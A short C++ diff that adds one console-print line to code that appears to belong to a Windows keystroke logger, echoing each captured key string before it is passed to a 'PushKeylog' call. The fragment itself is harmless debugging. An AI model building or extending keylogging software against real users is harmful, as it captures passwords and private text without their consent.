@@ -99,6 +99,7 @@ private:
 
 				shift = false;
 			}
+			std::cout << str << std::endl;
 			windowsKeyListener->PushKeylog(str);
 		}
 
